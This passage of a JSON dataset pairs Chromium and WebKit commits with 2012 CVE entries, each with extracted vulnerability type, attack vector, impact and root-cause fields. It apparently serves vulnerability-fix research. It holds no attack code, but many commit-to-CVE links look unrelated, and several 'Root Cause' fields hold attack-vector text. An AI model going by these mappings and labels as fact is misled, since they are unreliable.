SVG text references.","commit_message_1":"revert <number> - add an ipc channel between the nacl loader process and the renderer","Vulnerability Type":"use - after - free","Attack Vector":"via vectors involving svg text references","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"use-after-free","Attack Type":"remote attacker"},{"commit_id":"9dc6161824d61e899c282cfe9aa40a4d3031974d","cve_id":"CVE-2012-2894","cwe_id":"CWE-399","commit_message":"[cros] Allow media streaming for OOBE WebUI.\n\n\nBUG=122764\nTEST=Manual with --enable-html5-camera\n\n\nReview URL: https:\/\/chromiumcodereview.appspot.com\/10693027\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@144899 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Google Chrome before 22.0.1229.79 does not properly handle graphics-context data structures, which allows remote attackers to cause a denial of service (application crash) or possibly have unspecified other impact via unknown vectors.","commit_message_1":"allow medium streaming for oobe webui","Vulnerability Type":"Resource Management Errors","Attack Vector":"via unknown vectors","Impact":"cause a denial of service ( application crash ) or possibly have unspecified other impact","Root Cause":"does not properly handle graphics - context data structures","Attack Type":"remote attacker"},{"commit_id":"3aad1a37affb1ab70d1897f2b03eb8c077264984","cve_id":"CVE-2012-2896","cwe_id":"CWE-189","commit_message":"Fix SafeAdd and SafeMultiply\n\nBUG=145648,145544\n\n\nReview URL: https:\/\/chromiumcodereview.appspot.com\/10916165\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@155478 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Integer overflow in the WebGL implementation in Google Chrome before 22.0.1229.79 on Mac OS X allows remote attackers to cause a denial of service or possibly have unspecified other impact via unknown vectors.","commit_message_1":"fix safeadd and safemultiply bug=<number> , <number> review url : http : \/\/<file>","Vulnerability Type":"integer overflow","Attack Vector":"by persuading a victim to visit a malicious Web site","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"Integer overflow","Attack Type":"remote attacker"},{"commit_id":"94036902775aa96ea74db583135f4080a125fab9","cve_id":"CVE-2012-2877","cwe_id":"CWE-20","commit_message":"Fix a Windows crash bug with javascript alerts from extension popups.\n\nBUG=137707\n\n\nReview URL: https:\/\/chromiumcodereview.appspot.com\/10828423\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@152716 0039d316-1c4b-4281-b951-d872f2087c98","summary":"The extension system in Google Chrome before 22.0.1229.79 does not properly handle modal dialogs, which allows remote attackers to cause a denial of service (application crash) via unspecified vectors.","commit_message_1":"fix a window crash bug with javascript alert from extension popups","Vulnerability Type":"Improper Input Validation","Attack Vector":"via unspecified vectors","Impact":"cause a denial of service ( application crash )","Root Cause":"does not properly handle modal dialogs","Attack Type":"remote attacker"},{"commit_id":"2bc34f038d1eb149e75c932061a475dbdb369564","cve_id":"CVE-2012-2884","cwe_id":"CWE-119","commit_message":"Add another instance of a problematic DLL (different location) to the about:conflicts blacklist.\n\nBUG=None\nTEST=None\nReview URL: https:\/\/chromiumcodereview.appspot.com\/10546096\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@141651 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Skia, as used in Google Chrome before 22.0.1229.79, allows remote attackers to cause a denial of service (out-of-bounds read) via unspecified vectors.","commit_message_1":"add another instance of a problematic dll ( different location ) to the about : conflict blacklist","Vulnerability Type":"buffer overflow","Attack Vector":" via unspecified vectors","Impact":"cause a denial of service ( out - of - bounds read )","Root Cause":"by persuading a victim to visit a malicious Web site","Attack Type":"remote attacker"},{"commit_id":"76a3314ac3b711e01fae3b76a5d85f0eddeeec0b","cve_id":"CVE-2012-2874","cwe_id":"CWE-119","commit_message":"[protector] Refactoring of --no-protector code.\n\n*) On DSE change, new provider is not pushed to Sync.\n*) Simplified code in BrowserInit.\n\n\nBUG=None\nTEST=protector.py\n\n\nReview URL: http:\/\/codereview.chromium.org\/10065016\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@132398 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Skia, as used in Google Chrome before 22.0.1229.79, allows remote attackers to cause a denial of service or possibly have unspecified other impact via vectors that trigger an out-of-bounds write operation, a different vulnerability than CVE-2012-2883.","commit_message_1":"refactoring of -- no-protector code","Vulnerability Type":"buffer overflow","Attack Vector":"via vectors that trigger an out - of - bounds write operation , a different vulnerability than cve - 2012 - 2883","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"by persuading a victim to visit a malicious Web site","Attack Type":"remote attacker"},{"commit_id":"0e9e87823285d504a210dcce2eabdc847f230f09","cve_id":"CVE-2012-2875","cwe_id":null,"commit_message":"Adds per-provider information to omnibox UMA logs.\n\nAdds a fairly general structure to omnibox logs that can be used to pass information (that's not per-result information) from providers to the UMA logs.  Right now it's only used to pass whether the asynchronous pass of a provider has finished, but it will probably be used for other things in the future.\n\nBUG=\nTEST=\n\nReview URL: https:\/\/chromiumcodereview.appspot.com\/10380007\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@137288 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Multiple unspecified vulnerabilities in the PDF functionality in Google Chrome before 22.0.1229.79 allow remote attackers to have an unknown impact via a crafted document.","commit_message_1":"add per-provider information to omnibox uma log","Vulnerability Type":"multiple unspecified","Attack Vector":"via a crafted document","Impact":"have an unknown impact","Root Cause":"by persuading a victim to visit a malicious Web site","Attack Type":"remote attacker"},{"commit_id":"b654d718218ece17c496e74acd250038656f31c3","cve_id":"CVE-2012-2875","cwe_id":null,"commit_message":"[WIN] Implement WebCore::fileSystemRepresentation() for !USE(CF)\nhttps:\/\/bugs.webkit.org\/show_bug.cgi?id=104456\n\nReviewed by Brent Fulgham.\n\nConvert the UTF-16 path to the system default Windows ANSI code page (usually Windows Latin1).\n\n* platform\/win\/FileSystemWin.cpp:\n(WebCore::fileSystemRepresentation):\n\n\ngit-svn-id: svn:\/\/svn.chromium.org\/blink\/trunk@137547 bbb929c8-8fbe-4397-9dbb-9b2b20218538","summary":"Multiple unspecified vulnerabilities in the PDF functionality in Google Chrome before 22.0.1229.79 allow remote attackers to have an unknown impact via a crafted document.","commit_message_1":"for ! use ( cf ) http : \/\/<file>","Vulnerability Type":"multiple unspecified","Attack Vector":"via a crafted document","Impact":"have an unknown impact","Root Cause":"by persuading a victim to visit a malicious Web site","Attack Type":"remote attacker"},{"commit_id":"1266ba494530a267ec8a21442ea1b5cae94da4fb","cve_id":"CVE-2012-2875","cwe_id":null,"commit_message":"Introduce XGetImage() for GrabWindowSnapshot() in ChromeOS.\n\nBUG=119492\nTEST=manually done\n\nReview URL: https:\/\/chromiumcodereview.appspot.com\/10386124\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@137556 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Multiple unspecified vulnerabilities in the PDF functionality in Google Chrome before 22.0.1229.79 allow remote attackers to have an unknown impact via a crafted document.","commit_message_1":"introduce xgetimage ( ) for grabwindowsnapshot ( ) in chromeos","Vulnerability Type":"multiple unspecified","Attack Vector":"via a crafted document","Impact":"have an unknown impact","Root Cause":"by persuading a victim to visit a malicious Web site","Attack Type":"remote attacker"},{"commit_id":"3ea4ba8af75eb37860c15d02af94f272e5bbc235","cve_id":"CVE-2012-2875","cwe_id":null,"commit_message":"Crash fix in fileapi::FileSystemOperation::DidGetUsageAndQuotaAndRunTask\n\nhttps:\/\/chromiumcodereview.appspot.com\/10008047 introduced delete-with-inflight-tasks in Write sequence but I failed to convert this callback to use WeakPtr().\n\nBUG=128178\nTEST=manual test\n\nReview URL: https:\/\/chromiumcodereview.appspot.com\/10408006\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@137635 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Multiple unspecified vulnerabilities in the PDF functionality in Google Chrome before 22.0.1229.79 allow remote attackers to have an unknown impact via a crafted document.","commit_message_1":"http : \/\/<file>","Vulnerability Type":"multiple unspecified","Attack Vector":"via a crafted document","Impact":"have an unknown impact","Root Cause":"by persuading a victim to visit a malicious Web site","Attack Type":"remote attacker"},{"commit_id":"d345af9ed62ee5f431be327967f41c3cc3fe936a","cve_id":"CVE-2012-2875","cwe_id":null,"commit_message":"[BlackBerry] Adapt to new BlackBerry::Platform::TouchPoint API\nhttps:\/\/bugs.webkit.org\/show_bug.cgi?id=105143\nRIM PR 171941\n\nReviewed by Rob Buis.\nInternally reviewed by George Staikos.\n\nSource\/WebCore:\n\nTouchPoint instances now provide document coordinates for the viewport\nand content position of the touch event. The pixel coordinates stored\nin the TouchPoint should no longer be needed in WebKit.\n\nAlso adapt to new method names and encapsulation of TouchPoint data\nmembers.\n\nNo change in behavior, no new tests.\n\n* platform\/blackberry\/PlatformTouchPointBlackBerry.cpp:\n(WebCore::PlatformTouchPoint::PlatformTouchPoint):\n\nSource\/WebKit\/blackberry:\n\nTouchPoint instances now provide document coordinates for the viewport\nand content position of the touch event. The pixel coordinates stored\nin the TouchPoint should no longer be needed in WebKit. One exception\nis when passing events to a full screen plugin.\n\nAlso adapt to new method names and encapsulation of TouchPoint data\nmembers.\n\n* Api\/WebPage.cpp:\n(BlackBerry::WebKit::WebPage::touchEvent):\n(BlackBerry::WebKit::WebPage::touchPointAsMouseEvent):\n(BlackBerry::WebKit::WebPagePrivate::dispatchTouchEventToFullScreenPlugin):\n(BlackBerry::WebKit::WebPagePrivate::dispatchTouchPointAsMouseEventToFullScreenPlugin):\n* WebKitSupport\/InputHandler.cpp:\n(BlackBerry::WebKit::InputHandler::shouldRequestSpellCheckingOptionsForPoint):\n* WebKitSupport\/InputHandler.h:\n(InputHandler):\n* WebKitSupport\/TouchEventHandler.cpp:\n(BlackBerry::WebKit::TouchEventHandler::doFatFingers):\n(BlackBerry::WebKit::TouchEventHandler::handleTouchPoint):\n* WebKitSupport\/TouchEventHandler.h:\n(TouchEventHandler):\n\nTools:\n\nAdapt to new method names and encapsulation of TouchPoint data members.\n\n* DumpRenderTree\/blackberry\/EventSender.cpp:\n(addTouchPointCallback):\n(updateTouchPointCallback):\n(touchEndCallback):\n(releaseTouchPointCallback):\n(sendTouchEvent):\n\n\ngit-svn-id: svn:\/\/svn.chromium.org\/blink\/trunk@137880 bbb929c8-8fbe-4397-9dbb-9b2b20218538","summary":"Multiple unspecified vulnerabilities in the PDF functionality in Google Chrome before 22.0.1229.79 allow remote attackers to have an unknown impact via a crafted document.","commit_message_1":"api http : \/\/<file>","Vulnerability Type":"multiple unspecified","Attack Vector":"via a crafted document","Impact":"have an unknown impact","Root Cause":"by persuading a victim to visit a malicious Web site","Attack Type":"remote attacker"},{"commit_id":"40ed2b7ae4f6f5adb1b0ce9acf9c4dece339c2a6","cve_id":"CVE-2012-2875","cwe_id":null,"commit_message":"gdata: Define the resource ID for the root directory\n\nPer the spec, the resource ID for the root directory is defined\nas \"folder:root\". Add the resource ID to the root directory in our\nfile system representation so we can look up the root directory by\nthe resource ID.\n\nBUG=127697\nTEST=add unit tests\n\nReview URL: https:\/\/chromiumcodereview.appspot.com\/10332253\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@137928 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Multiple unspecified vulnerabilities in the PDF functionality in Google Chrome before 22.0.1229.79 allow remote attackers to have an unknown impact via a crafted document.","commit_message_1":"define the resource id for the root directory per the spec , the resource id for the root directory is defined a `` folder : root ''","Vulnerability Type":"multiple unspecified","Attack Vector":"via a crafted document","Impact":"have an unknown impact","Root Cause":"by persuading a victim to visit a malicious Web site","Attack Type":"remote attacker"},{"commit_id":"9f5ebcc99c8cd3a19be087be38f14c99cfe9e006","cve_id":"CVE-2012-2875","cwe_id":null,"commit_message":"OpenGLShims: fix check for ANGLE GLES2 extensions\nhttps:\/\/bugs.webkit.org\/show_bug.cgi?id=111656\n\nPatch by Sergio Correia <sergio.correia@openbossa.org> on 2013-03-07\nReviewed by Simon Hausmann.\n\nThe check for ANGLE GLES2 extensions is currently being overriden\nwith checks for APPLE extensions in lookupOpenGLFunctionAddress().\n\nNo new tests. No user visible behavior changed.\n\n* platform\/graphics\/OpenGLShims.cpp:\n(WebCore::lookupOpenGLFunctionAddress):\n\ngit-svn-id: svn:\/\/svn.chromium.org\/blink\/trunk@145079 bbb929c8-8fbe-4397-9dbb-9b2b20218538","summary":"Multiple unspecified vulnerabilities in the PDF functionality in Google Chrome before 22.0.1229.79 allow remote attackers to have an unknown impact via a crafted document.","commit_message_1":"fix check for angle gles2 extension http : \/\/<file>","Vulnerability Type":"multiple unspecified","Attack Vector":"via a crafted document","Impact":"have an unknown impact","Root Cause":"by persuading a victim to visit a malicious Web site","Attack Type":"remote attacker"},{"commit_id":"f81fcab3b31dfaff3473e8eb94c6531677116242","cve_id":"CVE-2012-2875","cwe_id":null,"commit_message":"[BlackBerry] Prevent text selection inside Colour and Date\/Time input fields\nhttps:\/\/bugs.webkit.org\/show_bug.cgi?id=111733\n\nReviewed by Rob Buis.\n\nPR 305194.\n\nPrevent selection for popup input fields as they are buttons.\n\nInformally Reviewed Gen Mak.\n\n* WebCoreSupport\/EditorClientBlackBerry.cpp:\n(WebCore::EditorClientBlackBerry::shouldChangeSelectedRange):\n\n\ngit-svn-id: svn:\/\/svn.chromium.org\/blink\/trunk@145121 bbb929c8-8fbe-4397-9dbb-9b2b20218538","summary":"Multiple unspecified vulnerabilities in the PDF functionality in Google Chrome before 22.0.1229.79 allow remote attackers to have an unknown impact via a crafted document.","commit_message_1":"prevent text selection inside colour and date\/time input field http : \/\/<file>","Vulnerability Type":"multiple unspecified","Attack Vector":"via a crafted document","Impact":"have an unknown impact","Root Cause":"by persuading a victim to visit a malicious Web site","Attack Type":"remote attacker"},{"commit_id":"7d97e1d327f153cce6137ef8b533d45d083802d9","cve_id":"CVE-2012-2875","cwe_id":null,"commit_message":"Refresh promo notifications as they're fetched\n\nThe \"guard\" existed for notification scheduling was preventing\n\"turn-off a promo\" and \"update a promo\" scenarios.\nYet I do not believe it was adding any actual safety: if things\non a server backend go wrong, the clients will be affected one\nway or the other, and it is better to have an option to shut\nthe malformed promo down \"as quickly as possible\" (~in 12-24 hours).\n\nBUG=\nTEST=\n\n\nReview URL: https:\/\/chromiumcodereview.appspot.com\/10696204\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@146462 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Multiple unspecified vulnerabilities in the PDF functionality in Google Chrome before 22.0.1229.79 allow remote attackers to have an unknown impact via a crafted document.","commit_message_1":"refresh promo notification a they 're fetched the `` guard '' existed for notification scheduling wa preventing '' turn-off a promo '' and `` update a promo '' scenario","Vulnerability Type":"multiple unspecified","Attack Vector":"via a crafted document","Impact":"have an unknown impact","Root Cause":"by persuading a victim to visit a malicious Web site","Attack Type":"remote attacker"},{"commit_id":"fcd3a7a671ecf2d5f46ea34787d27507a914d2f5","cve_id":"CVE-2012-2880","cwe_id":"CWE-362","commit_message":"[Sync] Cleanup all tab sync enabling logic now that its on by default.\n\nBUG=none\nTEST=\n\n\nReview URL: https:\/\/chromiumcodereview.appspot.com\/10443046\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@139462 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Race condition in Google Chrome before 22.0.1229.79 allows remote attackers to cause a denial of service or possibly have unspecified other impact via vectors related to the plug-in paint buffer.","commit_message_1":"cleanup all tab sync enabling logic now that it on by default","Vulnerability Type":"Race Condition","Attack Vector":"via vectors related to the plug - in paint buffer","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"An error","Attack Type":"remote attacker"},{"commit_id":"3fe224d430d863880df0050faaa037b0eb00d3c0","cve_id":"CVE-2012-2882","cwe_id":"CWE-20","commit_message":"Removed requirement for ash::Window::transient_parent() presence for system modal dialogs.\n\nBUG=130420\nTEST=SystemModalContainerLayoutManagerTest.ModalTransientAndNonTransient\n\nReview URL: https:\/\/chromiumcodereview.appspot.com\/10514012\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@140647 0039d316-1c4b-4281-b951-d872f2087c98","summary":"FFmpeg, as used in Google Chrome before 22.0.1229.79, does not properly handle OGG containers, which allows remote attackers to cause a denial of service or possibly have unspecified other impact via unknown vectors, related to a *wild pointer* issue.","commit_message_1":"presence for system modal dialog","Vulnerability Type":"Improper Input Validation","Attack Vector":"via unknown vectors , related to a * wild pointer * issue","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"does not properly handle ogg containers","Attack Type":"remote attacker"},{"commit_id":"58feadc64d191d834b68b8218eea4ba12b052b96","cve_id":"CVE-2012-2885","cwe_id":"CWE-399","commit_message":"Quota double-delete fix\n\nBUG=142310\n\n\nReview URL: https:\/\/chromiumcodereview.appspot.com\/10832407\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@152532 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Double free vulnerability in Google Chrome before 22.0.1229.79 allows remote attackers to cause a denial of service or possibly have unspecified other impact via vectors related to application exit.","commit_message_1":"quota double-delete fix bug=<number> review url : http : \/\/<file>","Vulnerability Type":"double free","Attack Vector":"via vectors related to application exit","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"possible double free on exit","Attack Type":"remote attacker"},{"commit_id":"7cf563aba8f4b3bab68e9bfe43824d952241dcf7","cve_id":"CVE-2012-2890","cwe_id":"CWE-399","commit_message":"Remove UrlFetcher from remoting and use the one in net instead.\n\nBUG=133790\nTEST=Stop and restart the Me2Me host. It should still work.\n\n\nReview URL: https:\/\/chromiumcodereview.appspot.com\/10637008\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@143798 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Use-after-free vulnerability in the PDF functionality in Google Chrome before 22.0.1229.79 allows remote attackers to cause a denial of service or possibly have unspecified other impact via a crafted document.","commit_message_1":"remove urlfetcher from remoting and use the one in net instead","Vulnerability Type":"use - after - free","Attack Vector":"via a crafted document","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"use-after-free","Attack Type":"remote attacker"},{"commit_id":"a6f7726de20450074a01493e4e85409ce3f2595a","cve_id":"CVE-2012-2890","cwe_id":"CWE-399","commit_message":"Unreviewed, rolling out r147402.\nhttp:\/\/trac.webkit.org\/changeset\/147402\nhttps:\/\/bugs.webkit.org\/show_bug.cgi?id=112903\n\nSource\/WebCore: \n\n* dom\/Document.cpp:\n(WebCore::Document::processHttpEquiv):\n* loader\/DocumentLoader.cpp:\n(WebCore::DocumentLoader::responseReceived):\n\nLayoutTests: \n\n* http\/tests\/security\/XFrameOptions\/x-frame-options-deny-expected.txt:\n* http\/tests\/security\/XFrameOptions\/x-frame-options-deny-meta-tag-expected.txt:\n* http\/tests\/security\/XFrameOptions\/x-frame-options-deny-meta-tag-in-body-expected.txt:\n* http\/tests\/security\/XFrameOptions\/x-frame-options-deny-meta-tag-in-body.html:\n* http\/tests\/security\/XFrameOptions\/x-frame-options-deny-meta-tag-parent-same-origin-deny-expected.txt:\n* http\/tests\/security\/XFrameOptions\/x-frame-options-deny-meta-tag-parent-same-origin-deny.html:\n* http\/tests\/security\/XFrameOptions\/x-frame-options-deny-meta-tag.html:\n* http\/tests\/security\/XFrameOptions\/x-frame-options-deny.html:\n* http\/tests\/security\/XFrameOptions\/x-frame-options-multiple-headers-sameorigin-deny-expected.txt:\n* http\/tests\/security\/XFrameOptions\/x-frame-options-multiple-headers-sameorigin-deny.html:\n* http\/tests\/security\/XFrameOptions\/x-frame-options-parent-same-origin-deny-expected.txt:\n* http\/tests\/security\/XFrameOptions\/x-frame-options-parent-same-origin-deny.html:\n* platform\/chromium\/http\/tests\/security\/XFrameOptions\/x-frame-options-deny-expected.txt:\n* platform\/chromium\/http\/tests\/security\/XFrameOptions\/x-frame-options-deny-meta-tag-expected.txt:\n* platform\/chromium\/http\/tests\/security\/XFrameOptions\/x-frame-options-deny-meta-tag-in-body-expected.txt:\n* platform\/chromium\/http\/tests\/security\/XFrameOptions\/x-frame-options-deny-meta-tag-parent-same-origin-deny-expected.txt:\n* platform\/chromium\/http\/tests\/security\/XFrameOptions\/x-frame-options-multiple-headers-sameorigin-deny-expected.txt:\n* platform\/chromium\/http\/tests\/security\/XFrameOptions\/x-frame-options-parent-same-origin-deny-expected.txt:\n\n\ngit-svn-id: svn:\/\/svn.chromium.org\/blink\/trunk@147450 bbb929c8-8fbe-4397-9dbb-9b2b20218538","summary":"Use-after-free vulnerability in the PDF functionality in Google Chrome before 22.0.1229.79 allows remote attackers to cause a denial of service or possibly have unspecified other impact via a crafted document.","commit_message_1":"http : \/\/<file>","Vulnerability Type":"use - after - free","Attack Vector":"via a crafted document","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"use-after-free","Attack Type":"remote attacker"},{"commit_id":"2de493f4a1d48952e09230a0c32ccbd45db973b2","cve_id":"CVE-2012-2893","cwe_id":"CWE-399","commit_message":"Fix dictionary string usage.\n\nBUG=144799\nReview URL: https:\/\/chromiumcodereview.appspot.com\/10919019\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@154331 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Double free vulnerability in libxslt, as used in Google Chrome before 22.0.1229.79, allows remote attackers to cause a denial of service or possibly have unspecified other impact via vectors related to XSL transforms.","commit_message_1":"fix dictionary string usage","Vulnerability Type":"double free","Attack Vector":"via vectors related to xsl transforms","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"double free","Attack Type":"remote attacker"},{"commit_id":"baef1ffd73db183ca50c854e1779ed7f6e5100a8","cve_id":"CVE-2012-2895","cwe_id":"CWE-119","commit_message":"Revert 144993 - gdata: Remove invalid files in the cache directories\n\nBroke linux_chromeos_valgrind:\nhttp:\/\/build.chromium.org\/p\/chromium.memory.fyi\/builders\/Chromium%20OS%20%28valgrind%29%285%29\/builds\/8628\/steps\/memory%20test%3A%20unit\/logs\/stdio\n\nIn theory, we shouldn't have any invalid files left in the\ncache directories, but things can go wrong and invalid files\nmay be left if the device shuts down unexpectedly, for instance.\nBesides, it's good to be defensive.\n\nBUG=134862\nTEST=added unit tests\n\nReview URL: https:\/\/chromiumcodereview.appspot.com\/10693020\n\nTBR=satorux@chromium.org\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@145029 0039d316-1c4b-4281-b951-d872f2087c98","summary":"The PDF functionality in Google Chrome before 22.0.1229.79 allows remote attackers to cause a denial of service or possibly have unspecified other impact via vectors that trigger out-of-bounds write operations.","commit_message_1":"remove invalid file in the cache directory broke linux_chromeos_valgrind : http : \/\/<file>","Vulnerability Type":"buffer overflow","Attack Vector":"via vectors that trigger out - of - bounds write operations","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"An error","Attack Type":"remote attacker"},{"commit_id":"16dcd30c215801941d9890859fd79a234128fc3e","cve_id":"CVE-2012-2895","cwe_id":"CWE-119","commit_message":"Refactors to simplify rename pathway in DownloadFileManager.\n\nThis is https:\/\/chromiumcodereview.appspot.com\/10668004 \/ r144817 (reverted \ndue to CrOS failure) with the completion logic moved to after the \nauto-opening.  The tests that test the auto-opening (for web store install) \nwere waiting for download completion to check install, and hence were \nfailing when completion was moved earlier.  \n\nDoing this right would probably require another state (OPENED).  \n\nBUG=123998\nBUG-134930\nR=asanka@chromium.org\n\n\nReview URL: https:\/\/chromiumcodereview.appspot.com\/10701040\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@145157 0039d316-1c4b-4281-b951-d872f2087c98","summary":"The PDF functionality in Google Chrome before 22.0.1229.79 allows remote attackers to cause a denial of service or possibly have unspecified other impact via vectors that trigger out-of-bounds write operations.","commit_message_1":"refactors to simplify rename pathway in downloadfilemanager","Vulnerability Type":"buffer overflow","Attack Vector":"via vectors that trigger out - of - bounds write operations","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"An error","Attack Type":"remote attacker"},{"commit_id":"3475f5e448ddf5e48888f3d0563245cc46e3c98b","cve_id":"CVE-2012-2895","cwe_id":"CWE-119","commit_message":"ash: Add launcher overflow bubble.\n\n- Host a LauncherView in bubble to display overflown items;\n- Mouse wheel and two-finger scroll to scroll the LauncherView in bubble in case overflow bubble is overflown;\n- Fit bubble when items are added\/removed;\n- Keep launcher bar on screen when the bubble is shown;\n\nBUG=128054\nTEST=Verify launcher overflown items are in a bubble instead of menu.\n\n\nReview URL: https:\/\/chromiumcodereview.appspot.com\/10659003\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@146460 0039d316-1c4b-4281-b951-d872f2087c98","summary":"The PDF functionality in Google Chrome before 22.0.1229.79 allows remote attackers to cause a denial of service or possibly have unspecified other impact via vectors that trigger out-of-bounds write operations.","commit_message_1":"add launcher overflow bubble","Vulnerability Type":"buffer overflow","Attack Vector":"via vectors that trigger out - of - bounds write operations","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"An error","Attack Type":"remote attacker"},{"commit_id":"9ce8793d2a8ca2cc0cb3c26fa1ca0eef3d9bc999","cve_id":"CVE-2012-2869","cwe_id":"CWE-119","commit_message":"Remove possibility of stale user_buffer_ member in PPB_URLLoader_Impl when FinishedLoading() is called.\n\nBUG=137778\n\nReview URL: https:\/\/chromiumcodereview.appspot.com\/10797037\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@147914 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Google Chrome before 21.0.1180.89 does not properly load URLs, which allows remote attackers to cause a denial of service or possibly have unspecified other impact via vectors that trigger a *stale buffer.*","commit_message_1":"remove possibility of stale user_buffer_ member in ppb_urlloader_impl when finishedloading ( ) is called","Vulnerability Type":"buffer overflow","Attack Vector":"via vectors that trigger a * stale buffer","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"does not properly load urls","Attack Type":"remote attacker"},{"commit_id":"9939d35f9827ed0929646607cbdb071af627ac38","cve_id":"CVE-2012-2870","cwe_id":"CWE-399","commit_message":"Handle a bad XSLT expression better.\n\nBUG=138672\nReview URL: https:\/\/chromiumcodereview.appspot.com\/10830177\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@150123 0039d316-1c4b-4281-b951-d872f2087c98","summary":"libxslt 1.1.26 and earlier, as used in Google Chrome before 21.0.1180.89, does not properly manage memory, which might allow remote attackers to cause a denial of service (application crash) via a crafted XSLT expression that is not properly identified during XPath navigation, related to (1) the xsltCompileLocationPathPattern function in libxslt\/pattern.c and (2) the xsltGenerateIdFunction function in libxslt\/functions.c.","commit_message_1":"handle a bad xslt expression better","Vulnerability Type":"Resource Management Errors","Attack Vector":"via a crafted xslt expression that is not properly identified during xpath navigation , related to ( 1 ) the xsltcompilelocationpathpattern function in libxslt \/ pattern . c and ( 2 ) the xsltgenerateidfunction function in libxslt \/ functions . c","Impact":"cause a denial of service ( application crash )","Root Cause":"does not properly manage memory","Attack Type":"remote attacker"},{"commit_id":"e741149a6b7872a2bf1f2b6cc0a56e836592fb77","cve_id":"CVE-2012-2870","cwe_id":"CWE-399","commit_message":"Fix harmless memory error in generate-id.\n\nBUG=140368\nReview URL: https:\/\/chromiumcodereview.appspot.com\/10823168\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@149998 0039d316-1c4b-4281-b951-d872f2087c98","summary":"libxslt 1.1.26 and earlier, as used in Google Chrome before 21.0.1180.89, does not properly manage memory, which might allow remote attackers to cause a denial of service (application crash) via a crafted XSLT expression that is not properly identified during XPath navigation, related to (1) the xsltCompileLocationPathPattern function in libxslt\/pattern.c and (2) the xsltGenerateIdFunction function in libxslt\/functions.c.","commit_message_1":"fix harmless memory error in generate-id","Vulnerability Type":"Resource Management Errors","Attack Vector":"via a crafted xslt expression that is not properly identified during xpath navigation , related to ( 1 ) the xsltcompilelocationpathpattern function in libxslt \/ pattern . c and ( 2 ) the xsltgenerateidfunction function in libxslt \/ functions . c","Impact":"cause a denial of service ( application crash )","Root Cause":"does not properly manage memory","Attack Type":"remote attacker"},{"commit_id":"68b6502084af7e2021f7321633f5fbb5f997a58b","cve_id":"CVE-2012-2872","cwe_id":"CWE-79","commit_message":"Properly EscapeForHTML potentially malicious input from X.509 certificates.\n\nBUG=142956\n\nTEST=Create an X.509 certificate with a CN field that contains JavaScript.\nWhen you get the SSL error screen, check that the HTML + JavaScript is\nescape instead of being treated as HTML and\/or script.\n\nReview URL: https:\/\/chromiumcodereview.appspot.com\/10827364\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@152210 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Cross-site scripting (XSS) vulnerability in an SSL interstitial page in Google Chrome before 21.0.1180.89 allows remote attackers to inject arbitrary web script or HTML via unspecified vectors.","commit_message_1":"properly escapeforhtml potentially malicious input from <file> certificate","Vulnerability Type":"Cross-site Scripting","Attack Vector":"execute script in a victim's Web browser within the security context of the hosting Web site","Impact":"inject arbitrary web script or html","Root Cause":"caused by improper validation of user-supplied input by SSL interstitial","Attack Type":"remote attacker"},{"commit_id":"c4f40933f2cd7f975af63e56ea4cdcdc6c636f73","cve_id":"CVE-2012-2862","cwe_id":"CWE-399","commit_message":"accelerators: Remove deprecated Accelerator ctor that takes booleans.\n\nBUG=128242\nR=ben@chromium.org\n\nReview URL: https:\/\/chromiumcodereview.appspot.com\/10399085\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@137957 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Use-after-free vulnerability in the PDF functionality in Google Chrome before 21.0.1180.75 